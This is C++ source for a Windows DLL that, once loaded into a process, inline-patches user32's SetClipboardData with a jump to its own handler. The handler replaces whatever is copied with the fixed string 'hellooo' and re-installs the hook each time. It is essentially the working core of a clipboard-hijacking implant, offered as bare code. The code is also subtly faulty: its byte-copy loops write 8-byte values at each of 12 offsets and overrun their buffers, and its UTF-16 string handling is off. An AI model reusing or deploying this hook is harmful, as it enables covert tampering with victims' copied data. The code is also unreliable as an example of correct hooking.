#include <windows.h>
#include <iostream>
#include <ctime>

using namespace std;

#ifdef __cplusplus   
extern "C" {         
#endif
 
__declspec(dllexport) BYTE *addr;
__declspec(dllexport) BYTE originalBytes[12] = {0};

__declspec(dllexport) HANDLE CtrlC(UINT uFormat, HANDLE hMem); 

__declspec(dllexport) char* UTF16Convert(char* target){
    size_t patternLen = strlen(target); 
    char *pattern = new char[patternLen * 2];

    for (int i = 0; i < patternLen; i++){
        pattern[2*i] = target[i];
        pattern[2*i + 1] = 0x0;
    }
    return pattern;
}


__declspec(dllexport) bool DeleteHook(){
    DWORD original_protection;

    VirtualProtect(addr, 12, PAGE_EXECUTE_READWRITE, &original_protection);

    for (int i = 0; i < 12; i++){
        *(DWORD64*)(addr + i) = *(DWORD64*)(originalBytes + i) ;
    }

    VirtualProtect(addr, 12, original_protection, &original_protection);

    return true;
}

__declspec(dllexport) bool SetHookCtrlC(){
    DWORD original_protection;

    VirtualProtect(addr, 12, PAGE_EXECUTE_READWRITE, &original_protection);

    for (int i = 0; i < 12; i++){
        *(DWORD64*)(originalBytes + i) = *(DWORD64*)(addr + i);
    }

    *(BYTE *)(addr) = 0x48;
    *(BYTE *)(addr + 1) = 0xB8; //mov rax, ...
    *(DWORD64 *)(addr + 2) = CtrlC;
    *(BYTE *)(addr + 10) = 0xFF;
    *(BYTE *)(addr + 11) = 0xE0; // jmp rax

    VirtualProtect(addr, 12, original_protection, &original_protection);

    return true;
}

__declspec(dllexport) HANDLE CtrlC(UINT uFormat, HANDLE hMem){
    DeleteHook();

    char *target = "hellooo";
    char *buffer = UTF16Convert(target);

    HANDLE hText = GlobalAlloc(GMEM_MOVEABLE, 2*strlen(target) + 1);
    HANDLE lpBuffer = GlobalLock(hText);
    memcpy(lpBuffer, buffer, 2*strlen(target) + 1);
    OpenClipboard(NULL);
    EmptyClipboard();

    Sleep(100);
    HANDLE cb = SetClipboardData(CF_UNICODETEXT, hText);
    SetHookCtrlC();

    return cb;
}


#ifdef __cplusplus
}
#endif

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved){
    switch(fdwReason){ 
        case DLL_PROCESS_ATTACH: 
            // mbox(L"Run");
            addr = (BYTE *)GetProcAddress(GetModuleHandleA("user32.dll"), "SetClipboardData");
            SetHookCtrlC();

            // addr = (BYTE *)GetProcAddress(GetModuleHandleA("user32.dll"), "SetClipboardData");
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;

}